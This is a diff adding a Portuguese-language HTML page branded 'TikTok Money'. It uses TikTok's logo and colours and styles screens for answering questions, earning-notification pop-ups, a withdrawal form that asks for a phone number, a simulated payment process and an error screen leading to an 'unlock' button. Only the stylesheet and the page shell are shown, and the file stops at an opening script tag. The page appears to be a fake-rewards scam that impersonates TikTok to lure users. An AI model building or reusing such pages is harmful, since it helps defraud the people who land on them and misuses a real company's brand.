@@ -1,0 +1,1759 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover" />
+  
+  <title>TikTok Money</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    :root {
+      --tt-red: #FE2C55;
+      --tt-red2: #ff4d6d;
+      --tt-blue: #25F4EE;
+      --tt-white: #FFFFFF;
+      --tt-black: #000000;
+      --tt-gray: #111111;
+      --tt-gray2: #1a1a1a;
+      --tt-gray3: #252525;
+      --tt-gray4: #333333;
+      --tt-muted: #7a7a7a;
+      --tt-border: rgba(255,255,255,0.07);
+      --tt-border2: rgba(255,255,255,0.12);
+      --safe-b: env(safe-area-inset-bottom, 0px);
+      --safe-t: env(safe-area-inset-top, 0px);
+    }
+
+    *, *::before, *::after {
+      margin: 0; padding: 0; box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    html {
+      background: var(--tt-black);
+      height: 100%;
+    }
+
+    body {
+      background: var(--tt-black);
+      min-height: 100dvh;
+      font-family: -apple-system, 'SF Pro Display', 'Helvetica Neue', sans-serif;
+      color: var(--tt-white);
+      overflow-x: hidden;
+      overscroll-behavior: none;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* ── TOPBAR ── */
+    .tt-topbar {
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      height: calc(52px + var(--safe-t));
+      padding-top: var(--safe-t);
+      background: rgba(0,0,0,0.92);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding-left: 16px;
+      padding-right: 16px;
+      z-index: 100;
+      border-bottom: 1px solid var(--tt-border);
+    }
+
+    .tt-logo {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 19px;
+      font-weight: 900;
+      letter-spacing: -0.5px;
+    }
+
+    .tt-logo-icon {
+      width: 26px; height: 26px;
+      position: relative;
+      margin-right: 2px;
+    }
+    .tt-logo-icon::before {
+      content: '';
+      position: absolute;
+      inset: 1px;
+      background: var(--tt-blue);
+      border-radius: 5px;
+      transform: translate(2px, 2px);
+      opacity: 0.7;
+    }
+    .tt-logo-icon::after {
+      content: '';
+      position: absolute;
+      inset: 1px;
+      background: var(--tt-red);
+      border-radius: 5px;
+      transform: translate(-2px, -2px);
+      opacity: 0.7;
+    }
+    .tt-logo-icon i {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      color: white;
+      z-index: 1;
+    }
+
+    .tt-logo .r { color: var(--tt-red); }
+    .tt-logo .b { color: var(--tt-blue); text-shadow: -2px 0 var(--tt-red); }
+    .tt-logo .m { color: var(--tt-muted); font-size: 11px; font-weight: 600; margin-left: 1px; }
+
+    .tt-chip {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: var(--tt-gray2);
+      border: 1px solid var(--tt-border2);
+      border-radius: 20px;
+      padding: 5px 12px;
+      font-size: 13px;
+      font-weight: 800;
+      color: var(--tt-white);
+      transition: all 0.3s ease;
+    }
+
+    .tt-chip .live-dot {
+      width: 7px; height: 7px;
+      background: var(--tt-red);
+      border-radius: 50%;
+      animation: livepulse 1.4s ease infinite;
+    }
+
+    @keyframes livepulse {
+      0%,100% { opacity:1; transform: scale(1); }
+      50% { opacity:0.4; transform: scale(0.8); }
+    }
+
+    /* ── BOTTOM NAV ── */
+    .tt-nav {
+      position: fixed;
+      bottom: 0; left: 0; right: 0;
+      height: calc(54px + var(--safe-b));
+      padding-bottom: var(--safe-b);
+      background: rgba(0,0,0,0.95);
+      backdrop-filter: blur(20px);
+      border-top: 1px solid var(--tt-border);
+      display: flex;
+      align-items: center;
+      justify-content: space-around;
+      z-index: 100;
+    }
+
+    .nav-i {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 2px;
+      flex: 1;
+      padding: 6px 0;
+      opacity: 0.45;
+      font-size: 9px;
+      font-weight: 700;
+      letter-spacing: 0.2px;
+      color: var(--tt-white);
+    }
+    .nav-i.on { opacity: 1; }
+    .nav-i i { font-size: 20px; }
+
+    .nav-plus-wrap {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+    }
+
+    .nav-plus {
+      width: 46px; height: 28px;
+      border-radius: 7px;
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+    .nav-plus::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(to right, var(--tt-blue) 50%, var(--tt-red) 50%);
+    }
+    .nav-plus::after {
+      content: '';
+      position: absolute;
+      inset: 2px;
+      background: var(--tt-white);
+      border-radius: 5px;
+    }
+    .nav-plus i { position: relative; z-index: 1; color: var(--tt-black); font-size: 16px; font-weight: 900; }
+
+    /* ── CONTENT COM SCROLL ── */
+    .tt-content {
+      position: relative;
+      padding-top: calc(52px + var(--safe-t));
+      padding-bottom: calc(54px + var(--safe-b));
+      min-height: 100dvh;
+      height: 100dvh;
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
+    }
+
+    .page {
+      padding: 14px 15px 24px;
+    }
+
+    /* ── PAGE TRANSITION ── */
+    @keyframes pageIn {
+      from { opacity: 0; transform: translateY(20px) scale(0.99); }
+      to   { opacity: 1; transform: translateY(0) scale(1); }
+    }
+    .page-animate { animation: pageIn 0.35s cubic-bezier(0.22,1,0.36,1) both; }
+
+    /* ── USER BAR ── */
+    .u-bar {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 10px 0 14px;
+      margin-bottom: 4px;
+    }
+
+    .u-avatar {
+      width: 38px; height: 38px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, var(--tt-red), #ff7b7b);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 17px;
+      flex-shrink: 0;
+      box-shadow: 0 0 0 2px var(--tt-black), 0 0 0 3.5px var(--tt-red);
+    }
+
+    .u-name { font-size: 13px; font-weight: 800; line-height: 1.2; }
+    .u-tag { font-size: 11px; color: var(--tt-muted); }
+
+    .u-follow {
+      margin-left: auto;
+      background: var(--tt-red);
+      color: white;
+      border: none;
+      border-radius: 4px;
+      padding: 6px 18px;
+      font-size: 13px;
+      font-weight: 700;
+      cursor: pointer;
+      letter-spacing: 0.1px;
+      transition: all 0.2s ease;
+    }
+
+    .u-follow.following {
+      background: var(--tt-gray3);
+      color: var(--tt-muted);
+    }
+
+    /* ── LANDING ── */
+    .land-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      background: rgba(254,44,85,0.1);
+      border: 1px solid rgba(254,44,85,0.25);
+      color: var(--tt-red);
+      font-size: 10px;
+      font-weight: 900;
+      padding: 8px 14px;
+      border-radius: 20px;
+      margin-bottom: 12px;
+      margin-top: 14px;
+      letter-spacing: 0.6px;
+    }
+
+    .land-title {
+      font-size: 27px;
+      font-weight: 900;
+      line-height: 1.15;
+      margin-bottom: 8px;
+      letter-spacing: -0.6px;
+    }
+    .land-title .hl { color: var(--tt-red); }
+
+    .land-sub {
+      font-size: 13px;
+      color: var(--tt-muted);
+      line-height: 1.55;
+      margin-bottom: 20px;
+    }
+
+    .stats-row {
+      display: grid;
+      grid-template-columns: repeat(3,1fr);
+      gap: 8px;
+      margin-bottom: 20px;
+    }
+
+    .stat-box {
+      background: var(--tt-gray2);
+      border-radius: 10px;
+      padding: 12px 6px;
+      text-align: center;
+      border: 1px solid var(--tt-border);
+    }
+    .stat-val { font-size: 17px; font-weight: 900; }
+    .stat-val.r { color: var(--tt-red); }
+    .stat-val.b { color: var(--tt-blue); }
+    .stat-lbl { font-size: 9px; color: var(--tt-muted); margin-top: 2px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.3px; }
+
+    /* ── CTA ── */
+    .cta-btn {
+      width: 100%;
+      border: none;
+      background: var(--tt-red);
+      color: white;
+      font-size: 15px;
+      font-weight: 800;
+      border-radius: 6px;
+      padding: 16px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 9px;
+      min-height: 52px;
+      position: relative;
+      overflow: hidden;
+      letter-spacing: 0.2px;
+    }
+    .cta-btn::after {
+      content: '';
+      position: absolute;
+      top: 0; left: -80%;
+      width: 50%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.18), transparent);
+      animation: shimmer 2.8s ease infinite;
+    }
+    @keyframes shimmer { to { left: 160%; } }
+    .cta-btn:active { filter: brightness(0.88); transform: scale(0.99); }
+
+    .land-footer {
+      text-align: center;
+      font-size: 10px;
+      color: var(--tt-muted);
+      line-height: 1.6;
+      margin-top: 20px;
+    }
+    .land-footer a { color: var(--tt-muted); text-decoration: underline; }
+
+    /* ── DIVIDER ── */
+    .divider { border: none; border-top: 1px solid var(--tt-border); margin: 0 0 14px; }
+
+    /* ── PROGRESS ── */
+    .prog-wrap { margin-bottom: 16px; }
+    .prog-top {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 8px;
+    }
+    .prog-lbl { font-size: 12px; color: var(--tt-muted); font-weight: 600; }
+    .prog-reward {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      background: rgba(254,44,85,0.12);
+      border: 1px solid rgba(254,44,85,0.3);
+      color: var(--tt-red);
+      font-size: 11px;
+      font-weight: 800;
+      padding: 3px 10px;
+      border-radius: 20px;
+    }
+
+    .prog-bar {
+      width: 100%;
+      height: 3px;
+      background: var(--tt-gray3);
+      border-radius: 2px;
+      overflow: hidden;
+    }
+    .prog-fill {
+      height: 100%;
+      background: linear-gradient(90deg, var(--tt-red), var(--tt-red2));
+      border-radius: 2px;
+      transition: width 0.6s cubic-bezier(0.4,0,0.2,1);
+    }
+
+    /* ── QUESTION CARD ── */
+    .q-card {
+      background: var(--tt-gray2);
+      border: 1px solid var(--tt-border);
+      border-radius: 14px;
+      padding: 16px 15px;
+      margin-bottom: 12px;
+      position: relative;
+      overflow: hidden;
+    }
+    .q-card::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0;
+      width: 3px; height: 100%;
+      background: var(--tt-red);
+      border-radius: 0 2px 2px 0;
+    }
+
+    .q-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      background: rgba(254,44,85,0.12);
+      border: 1px solid rgba(254,44,85,0.25);
+      color: var(--tt-red);
+      font-size: 9px;
+      font-weight: 800;
+      padding: 2px 9px;
+      border-radius: 4px;
+      margin-bottom: 8px;
+      letter-spacing: 0.7px;
+      text-transform: uppercase;
+    }
+
+    .q-text {
+      font-size: 15.5px;
+      font-weight: 700;
+      line-height: 1.4;
+      color: var(--tt-white);
+    }
+
+    /* ── OPTIONS ── */
+    .opts { display: flex; flex-direction: column; gap: 9px; }
+
+    .opt-btn {
+      width: 100%;
+      background: var(--tt-gray2);
+      border: 1.5px solid var(--tt-border);
+      border-radius: 12px;
+      padding: 13px 14px;
+      display: flex;
+      align-items: center;
+      gap: 11px;
+      font-size: 13.5px;
+      font-weight: 600;
+      color: var(--tt-white);
+      cursor: pointer;
+      text-align: left;
+      min-height: 52px;
+      transition: border-color 0.15s ease, background 0.15s ease, transform 0.1s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .opt-btn::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: var(--tt-red);
+      opacity: 0;
+      transition: opacity 0.15s;
+    }
+
+    .opt-btn:active {
+      transform: scale(0.98);
+      border-color: var(--tt-red);
+    }
+    .opt-btn:active::before { opacity: 0.07; }
+
+    .opt-letter {
+      width: 26px; height: 26px;
+      background: var(--tt-gray3);
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 11px;
+      font-weight: 900;
+      color: var(--tt-muted);
+      flex-shrink: 0;
+      position: relative;
+    }
+
+    .opt-emoji { font-size: 20px; flex-shrink: 0; position: relative; }
+
+    .opt-txt { flex: 1; position: relative; }
+
+    /* ── REWARD NOTE ── */
+    .reward-note {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 7px;
+      background: rgba(37,244,238,0.05);
+      border: 1px solid rgba(37,244,238,0.15);
+      border-radius: 10px;
+      padding: 11px;
+      margin-top: 14px;
+      font-size: 12px;
+      font-weight: 700;
+      color: var(--tt-blue);
+      animation: notepulse 2.5s ease infinite;
+    }
+    @keyframes notepulse {
+      0%,100% { border-color: rgba(37,244,238,0.15); }
+      50%      { border-color: rgba(37,244,238,0.4); }
+    }
+
+    /* ── MODAL CENTRALIZADO (notificação de ganhos) ── */
+    .modal-center {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.85);
+      backdrop-filter: blur(12px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 200;
+      animation: fadeInModal 0.25s ease;
+    }
+
+    @keyframes fadeInModal {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .modal-card {
+      width: 300px;
+      max-width: 85%;
+      background: var(--tt-gray);
+      border: 1px solid var(--tt-border2);
+      border-radius: 28px;
+      padding: 28px 20px;
+      text-align: center;
+      animation: modalPop 0.4s cubic-bezier(0.34, 1.2, 0.64, 1);
+      box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+    }
+
+    @keyframes modalPop {
+      from {
+        opacity: 0;
+        transform: scale(0.85) translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: scale(1) translateY(0);
+      }
+    }
+
+    .modal-icon {
+      width: 70px;
+      height: 70px;
+      margin: 0 auto 16px;
+      background: linear-gradient(135deg, rgba(254,44,85,0.15), rgba(37,244,238,0.1));
+      border: 2px solid var(--tt-red);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 32px;
+      color: var(--tt-red);
+      animation: iconPop 0.5s ease-out;
+    }
+
+    @keyframes iconPop {
+      0% { transform: scale(0); opacity: 0; }
+      50% { transform: scale(1.2); }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    .modal-title {
+      font-size: 12px;
+      color: var(--tt-muted);
+      letter-spacing: 1px;
+      font-weight: 600;
+      margin-bottom: 8px;
+      text-transform: uppercase;
+    }
+
+    .modal-amount {
+      font-size: 48px;
+      font-weight: 900;
+      color: var(--tt-white);
+      line-height: 1;
+      margin-bottom: 8px;
+    }
+
+    .modal-amount small {
+      font-size: 20px;
+      font-weight: 600;
+    }
+
+    .modal-sub {
+      font-size: 12px;
+      color: var(--tt-muted);
+      margin-bottom: 20px;
+    }
+
+    .modal-divider {
+      height: 1px;
+      background: var(--tt-border);
+      margin: 16px 0;
+    }
+
+    .modal-balance-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: var(--tt-gray2);
+      border-radius: 14px;
+      padding: 12px 16px;
+      margin-bottom: 20px;
+    }
+
+    .modal-balance-row .label {
+      font-size: 13px;
+      color: var(--tt-muted);
+    }
+
+    .modal-balance-row .value {
+      font-size: 20px;
+      font-weight: 800;
+      color: var(--tt-red);
+    }
+
+    .modal-btn {
+      width: 100%;
+      border: none;
+      background: var(--tt-red);
+      color: white;
+      font-size: 16px;
+      font-weight: 800;
+      border-radius: 40px;
+      padding: 14px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .modal-btn:active {
+      transform: scale(0.97);
+      filter: brightness(0.9);
+    }
+
+    /* ── PROCESSING ── */
+    .proc-wrap {
+      text-align: center;
+      padding: 16px 0 10px;
+    }
+
+    .proc-ring-outer {
+      width: 88px; height: 88px;
+      margin: 0 auto 22px;
+      position: relative;
+    }
+
+    .proc-ring {
+      width: 88px; height: 88px;
+      border-radius: 50%;
+      border: 3px solid var(--tt-gray3);
+      border-top-color: var(--tt-red);
+      border-right-color: rgba(254,44,85,0.3);
+      animation: spin 0.75s linear infinite;
+      position: absolute;
+      inset: 0;
+    }
+    .proc-ring2 {
+      width: 66px; height: 66px;
+      border-radius: 50%;
+      border: 2px solid var(--tt-gray3);
+      border-bottom-color: var(--tt-blue);
+      animation: spin 1.2s linear infinite reverse;
+      position: absolute;
+      top: 11px; left: 11px;
+    }
+    .proc-center {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 26px;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .proc-title { font-size: 20px; font-weight: 900; margin-bottom: 5px; }
+    .proc-sub { font-size: 12px; color: var(--tt-muted); margin-bottom: 24px; }
+
+    .status-list { display: flex; flex-direction: column; gap: 8px; }
+
+    .st-item {
+      background: var(--tt-gray2);
+      border: 1px solid var(--tt-border);
+      border-radius: 12px;
+      padding: 12px 14px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-size: 13px;
+      color: var(--tt-muted);
+      font-weight: 600;
+      transition: all 0.4s cubic-bezier(0.22,1,0.36,1);
+      animation: stIn 0.4s ease both;
+    }
+    .st-item:nth-child(1) { animation-delay: 0.05s; }
+    .st-item:nth-child(2) { animation-delay: 0.12s; }
+    .st-item:nth-child(3) { animation-delay: 0.19s; }
+    .st-item:nth-child(4) { animation-delay: 0.26s; }
+
+    @keyframes stIn {
+      from { opacity:0; transform: translateX(-12px); }
+      to   { opacity:1; transform: translateX(0); }
+    }
+
+    .st-item.ok      { border-color: rgba(37,244,238,0.3); background: rgba(37,244,238,0.05); color: var(--tt-blue); }
+    .st-item.running { border-color: rgba(254,44,85,0.3);  background: rgba(254,44,85,0.05);  color: var(--tt-red); }
+
+    .st-left { display: flex; align-items: center; gap: 10px; }
+    .st-right { font-size: 14px; }
+
+    /* ── RESULT (COM SCROLL GARANTIDO) ── */
+    .tt-result {
+      display: block;
+      width: 100%;
+    }
+
+    .result-hero {
+      text-align: center;
+      padding: 6px 0 16px;
+    }
+
+    .trophy-wrap {
+      font-size: 54px;
+      display: block;
+      margin-bottom: 10px;
+      animation: trophyIn 0.65s cubic-bezier(0.34,1.5,0.64,1) both;
+    }
+    @keyframes trophyIn {
+      from { transform: scale(0.2) rotate(-15deg); opacity:0; }
+      to   { transform: scale(1)   rotate(0deg);   opacity:1; }
+    }
+
+    .result-title { font-size: 25px; font-weight: 900; line-height: 1.2; margin-bottom: 5px; letter-spacing: -0.5px; }
+    .result-title .r { color: var(--tt-red); }
+    .result-sub { font-size: 12px; color: var(--tt-muted); }
+
+    .total-box {
+      background: linear-gradient(135deg, rgba(254,44,85,0.11), rgba(37,244,238,0.05));
+      border: 1px solid rgba(254,44,85,0.22);
+      border-radius: 14px;
+      padding: 20px;
+      text-align: center;
+      margin-bottom: 14px;
+      animation: boxIn 0.5s cubic-bezier(0.22,1,0.36,1) 0.1s both;
+    }
+    @keyframes boxIn {
+      from { opacity:0; transform: scale(0.94); }
+      to   { opacity:1; transform: scale(1); }
+    }
+
+    .total-lbl { font-size: 10px; color: var(--tt-muted); text-transform: uppercase; letter-spacing: 0.6px; margin-bottom: 8px; }
+    .total-val { font-size: 50px; font-weight: 900; color: var(--tt-white); line-height: 1; }
+
+    .detail-card {
+      background: var(--tt-gray2);
+      border: 1px solid var(--tt-border);
+      border-radius: 14px;
+      padding: 14px;
+      margin-bottom: 16px;
+      animation: boxIn 0.5s cubic-bezier(0.22,1,0.36,1) 0.18s both;
+    }
+    .detail-lbl { font-size: 10px; font-weight: 800; color: var(--tt-muted); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 11px; }
+
+    .detail-row {
+      display: flex;
+      justify-content: space-between;
+      font-size: 13px;
+      color: var(--tt-muted);
+      padding: 4px 0;
+    }
+    .detail-row .g { color: #4ade80; font-weight: 700; }
+    .detail-row.tot {
+      border-top: 1px solid var(--tt-border);
+      margin-top: 7px;
+      padding-top: 10px;
+      font-weight: 800;
+      color: var(--tt-white);
+      font-size: 14px;
+    }
+    .detail-row.tot .r { color: var(--tt-red); }
+
+    .btn-white {
+      width: 100%;
+      border: none;
+      background: var(--tt-white);
+      color: var(--tt-black);
+      font-size: 15px;
+      font-weight: 900;
+      border-radius: 6px;
+      padding: 15px;
+      cursor: pointer;
+      min-height: 52px;
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      animation: boxIn 0.5s cubic-bezier(0.22,1,0.36,1) 0.26s both;
+    }
+    .btn-white:active { filter: brightness(0.9); transform: scale(0.99); }
+
+    .small-note { text-align: center; font-size: 10.5px; color: var(--tt-muted); }
+
+    /* ── WITHDRAW ── */
+    .wd-title { font-size: 22px; font-weight: 900; margin-bottom: 4px; letter-spacing: -0.4px; }
+    .wd-title .r { color: var(--tt-red); }
+    .wd-sub { font-size: 12px; color: var(--tt-muted); margin-bottom: 18px; }
+
+    .amt-box {
+      background: var(--tt-gray2);
+      border: 1px solid var(--tt-border);
+      border-radius: 12px;
+      padding: 14px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+    .amt-box .lbl { font-size: 12px; color: var(--tt-muted); }
+    .amt-box .val { font-size: 22px; font-weight: 900; }
+    .amt-box .val-mzn {
+      font-size: 16px;
+      font-weight: 800;
+      color: var(--tt-blue);
+      background: rgba(37,244,238,0.1);
+      padding: 4px 12px;
+      border-radius: 20px;
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+    }
+    .amt-box .exchange-rate {
+      width: 100%;
+      font-size: 10px;
+      color: var(--tt-muted);
+      text-align: center;
+      margin-top: 8px;
+      padding-top: 8px;
+      border-top: 1px solid var(--tt-border);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 5px;
+    }
+    .amt-box .exchange-rate i {
+      color: var(--tt-blue);
+      font-size: 10px;
+    }
+
+    .sec-lbl { font-size: 10px; font-weight: 800; color: var(--tt-muted); text-transform: uppercase; letter-spacing: 0.6px; margin-bottom: 10px; }
+
+    .method-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px; }
+
+    .method-card {
+      background: var(--tt-gray2);
+      border: 2px solid var(--tt-border);
+      border-radius: 12px;
+      padding: 14px 10px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.22s ease;
+      min-height: 88px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .method-card.sel { border-color: var(--tt-red); background: rgba(254,44,85,0.07); }
+    .method-card:active { transform: scale(0.97); }
+    
+    /* Estilização das imagens nos métodos */
+    .method-card .method-img {
+      width: 48px;
+      height: 48px;
+      object-fit: contain;
+      border-radius: 12px;
+      transition: all 0.2s ease;
+    }
+    
+    .method-card.sel .method-img {
+      transform: scale(1.05);
+    }
+    
+    .method-card .mn { 
+      font-size: 13px; 
+      font-weight: 800; 
+      transition: color 0.2s; 
+    }
+    .method-card.sel .mn { color: var(--tt-red); }
+
+    .inp-wrap {
+      display: flex;
+      background: var(--tt-gray2);
+      border: 1.5px solid var(--tt-border);
+      border-radius: 12px;
+      margin-bottom: 18px;
+      overflow: hidden;
+      transition: border-color 0.2s;
+    }
+    .inp-wrap:focus-within { border-color: var(--tt-red); }
+
+    .prefix {
+      padding: 0 13px;
+      font-size: 14px;
+      font-weight: 800;
+      color: var(--tt-muted);
+      background: rgba(255,255,255,0.03);
+      height: 50px;
+      display: flex;
+      align-items: center;
+      border-right: 1px solid var(--tt-border);
+      white-space: nowrap;
+    }
+
+    .phone-inp {
+      flex: 1;
+      height: 50px;
+      border: none;
+      background: transparent;
+      padding: 0 13px;
+      font-size: 16px;
+      font-weight: 600;
+      color: var(--tt-white);
+      outline: none;
+      font-family: monospace;
+    }
+    .phone-inp::placeholder { color: var(--tt-muted); }
+
+    .pay-btn {
+      width: 100%;
+      border: none;
+      border-radius: 6px;
+      background: var(--tt-gray3);
+      color: var(--tt-muted);
+      font-size: 15px;
+      font-weight: 800;
+      padding: 15px;
+      margin-bottom: 12px;
+      cursor: not-allowed;
+      transition: all 0.25s ease;
+      min-height: 52px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .pay-btn.on {
+      background: var(--tt-red);
+      color: white;
+      cursor: pointer;
+    }
+    .pay-btn.on:active { filter: brightness(0.88); }
+
+    .secure-note { text-align: center; font-size: 11px; color: var(--tt-muted); }
+
+    /* ── PAYMENT ANIMATION ── */
+    .pay-anim-overlay {
+      position: fixed;
+      inset: 0;
+      background: var(--tt-black);
+      z-index: 300;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 20px;
+      animation: fadeIn 0.25s ease;
+    }
+    @keyframes fadeIn { from{opacity:0} to{opacity:1} }
+
+    .pay-anim-ring {
+      width: 90px; height: 90px;
+      border-radius: 50%;
+      border: 4px solid var(--tt-gray3);
+      border-top-color: var(--tt-red);
+      animation: spin 0.7s linear infinite;
+      position: relative;
+    }
+    .pay-anim-ring .pa-inner {
+      position: absolute;
+      inset: 12px;
+      border-radius: 50%;
+      background: rgba(254,44,85,0.1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      animation: spin 0.7s linear infinite reverse;
+    }
+
+    .pay-anim-steps {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      width: 80%;
+      max-width: 280px;
+    }
+
+    .pa-step {
+      background: var(--tt-gray2);
+      border: 1px solid var(--tt-border);
+      border-radius: 10px;
+      padding: 11px 14px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 13px;
+      color: var(--tt-muted);
+      font-weight: 600;
+      opacity: 0;
+      transform: translateY(8px);
+      transition: all 0.4s cubic-bezier(0.22,1,0.36,1);
+    }
+    .pa-step.show { opacity: 1; transform: translateY(0); }
+    .pa-step.ok   { border-color: rgba(254,44,85,0.35); color: var(--tt-red); background: rgba(254,44,85,0.05); }
+    .pa-step .pa-icon { font-size: 16px; width: 20px; text-align: center; }
+
+    .pay-anim-label {
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--tt-muted);
+      letter-spacing: 0.3px;
+    }
+
+    /* ── ERROR ── */
+    .err-icon {
+      width: 68px; height: 68px;
+      margin: 6px auto 16px;
+      background: rgba(254,44,85,0.1);
+      border: 2px solid rgba(254,44,85,0.3);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 28px;
+      color: var(--tt-red);
+      animation: shake 0.55s ease;
+    }
+    @keyframes shake {
+      0%,100%{transform:translateX(0)}
+      20%{transform:translateX(-6px)}
+      40%{transform:translateX(6px)}
+      60%{transform:translateX(-4px)}
+      80%{transform:translateX(4px)}
+    }
+    .err-title { text-align: center; font-size: 21px; font-weight: 900; margin-bottom: 6px; }
+    .err-sub { text-align: center; font-size: 13px; color: var(--tt-muted); line-height: 1.5; margin-bottom: 18px; }
+
+    .alert-box {
+      background: rgba(254,44,85,0.07);
+      border: 1px solid rgba(254,44,85,0.22);
+      border-radius: 12px;
+      padding: 14px;
+      margin-bottom: 16px;
+      display: flex;
+      gap: 10px;
+      align-items: flex-start;
+    }
+    .alert-box i { color: var(--tt-red); font-size: 17px; margin-top: 1px; }
+    .alert-title { font-size: 13px; font-weight: 800; color: var(--tt-red); margin-bottom: 4px; }
+    .alert-text { font-size: 12px; color: var(--tt-muted); line-height: 1.45; }
+
+    .vid-unlock {
+      background: rgba(254,44,85,0.05);
+      border: 1px solid rgba(254,44,85,0.18);
+      border-radius: 14px;
+      padding: 16px;
+      margin-bottom: 16px;
+      text-align: center;
+    }
+    .vid-badge { font-size: 9px; color: var(--tt-red); font-weight: 800; text-transform: uppercase; letter-spacing: 0.6px; margin-bottom: 6px; }
+    .vid-title { font-size: 15px; font-weight: 900; margin-bottom: 12px; }
+    .vid-feats { display: flex; justify-content: center; gap: 16px; font-size: 11px; color: var(--tt-muted); }
+    .vid-feats span { display: flex; align-items: center; gap: 4px; }
+
+    .vid-btn {
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      border: none;
+      background: var(--tt-red);
+      color: white;
+      font-size: 14px;
+      font-weight: 800;
+      border-radius: 6px;
+      padding: 14px;
+      cursor: pointer;
+      text-decoration: none;
+      min-height: 50px;
+      margin-top: 12px;
+    }
+    .vid-btn:active { filter: brightness(0.88); }
+
+    /* Responsivo */
+    @media (max-width: 480px) {
+      .method-card .method-img {
+        width: 40px;
+        height: 40px;
+      }
+      .amt-box .val-mzn {
+        font-size: 13px;
+        padding: 3px 10px;
+      }
+      .amt-box .val {
+        font-size: 18px;
+      }
+      .amt-box .exchange-rate {
+        font-size: 9px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- TOP BAR -->
+  <div class="tt-topbar">
+    <div class="tt-logo">
+      <div class="tt-logo-icon"><i class="fab fa-tiktok"></i></div>
+      <span class="r">Tik</span><span class="b">Tok</span>
+      <span class="m">Money</span>
+    </div>
+    <div class="tt-chip" id="topChip" style="display:none;">
+      <div class="live-dot"></div>
+      <span id="topVal">$0.00</span>
+    </div>
+  </div>
+
+  <!-- CONTENT -->
+  <div class="tt-content">
+    <div class="page" id="app"></div>
+  </div>
+
+  <!-- BOTTOM NAV -->
+  <div class="tt-nav">
+    <div class="nav-i on">
+      <i class="fas fa-home"></i>
+      <span>Início</span>
+    </div>
+    <div class="nav-i">
+      <i class="fas fa-search"></i>
+      <span>Descobrir</span>
+    </div>
+    <div class="nav-plus-wrap">
+      <div class="nav-plus"><i class="fas fa-plus"></i></div>
+    </div>
+    <div class="nav-i">
+      <i class="fas fa-comment-dots"></i>
+      <span>Inbox</span>
+    </div>
+    <div class="nav-i">
+      <i class="fas fa-user"></i>
+      <span>Perfil</span>
+    </div>
+  </div>
+
+<script>
